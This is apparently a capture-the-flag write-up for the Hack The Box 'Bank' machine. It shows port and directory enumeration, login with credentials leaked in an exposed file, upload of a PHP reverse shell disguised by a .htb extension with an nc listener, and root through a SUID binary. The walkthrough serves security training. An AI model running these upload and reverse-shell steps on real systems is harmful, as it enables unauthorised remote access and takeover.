# Enum

```sh
ping 10.10.10.29
sudo nmap 10.10.10.29 -A -T5
```

```
64 bytes from 10.10.10.29: icmp_seq=1 ttl=63 time=670 ms
...
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
53/tcp open  domain  ISC BIND 9.9.5-3ubuntu0.14 (Ubuntu Linux)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
```

# First Sight

- TCP Windows size is 64 bytes; It may indicate that the target's OS is Linux.
- http server running. It seems starting with it is good idea.

# Gaining Access

```
# investigate web server.
sudo whatweb http://10.10.10.29
# http://10.10.10.29 [200 OK] Apache[2.4.7], Country[RESERVED][zz], HTTPServer[Ubuntu Linux][apache/2.4.7 (ubuntu)], IP[10.10.10.29], Title[Apache2 Ubuntu Default Page: It works]
```

```
# bruteforce directories
gobuster dir -u http://bank.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -n  -t 100 -o out.txt

#   1   │ /uploads              [Size: 305] [--> http://bank.htb/uploads/]
#   2   │ /assets               [Size: 304] [--> http://bank.htb/assets/]
#   3   │ /inc                  [Size: 301] [--> http://bank.htb/inc/]
#   4   │ /server-status        [Size: 288]
#   5   │ /balance-transfer     [Size: 314] [--> http://bank.htb/balance-transfer/]
```

Let's ccess http://bank.htb/balance-transfer and sort files by size.
There are some anomaly files that far cry from others by size.

```
# http://bank.htb/balance-transfer/68576f20e9732f1b2edc4df5b8533230.acc

--ERR ENCRYPT FAILED
+=================+
| HTB Bank Report |
+=================+

===UserAccount===
Full Name: Christos Christopoulos
Email: chris@bank.htb
Password: !##HTBB4nkP4ssw0rd!##
CreditCards: 5
Transactions: 39
Balance: 8842803 .
===UserAccount===
```

Let's fall back to http://bank.htm/login.php and login by using above credential.

Once you can login, let's see page's code.

```html
<div style="position:relative;">
  <!-- [DEBUG] I added the file extension .htb to execute as php for debugging purposes only [DEBUG] -->
  <a class="btn btn-primary" href="javascript:;">
    Choose File...
    <input
      type="file"
      required
      style='position:absolute;z-index:2;top:0;left:0;filter: alpha(opacity=0);-ms-filter:"progid:DXImageTransform.Microsoft.Alpha(Opacity=0)";opacity:0;background-color:transparent;color:transparent;'
      name="fileToUpload"
      size="40"
      onchange='$("#upload-file-info").html($(this).val().replace("C:\\fakepath\\", ""));'
    />
  </a>
  &nbsp;
  <span class="label label-info" id="upload-file-info"></span>
</div>
```

with a file extension 'htb'

```
cp /usr/share/webshells/php/php-reverse-shell.php rshell.htb
vim ./rshell.htb
# change ip and port
nc -lvnp 4444
```

By accessing http://bank.htb/uploads/rshell.htb you got reverse shell.

# Privilege Escalation

[[Linux Privilege Escalation.md]]

```
wget "https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh" -O lse.sh;chmod 700 lse.sh
# lse.sh: Permission denied
touch a
# touch: cannot touch 'a': Permission denied
```

It seems that you can't create any file,so put a bare command to find files that have SETUID flag.

```
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null;
```

You can see a 'emergency' binary exists,by executing it,you get root privilege.
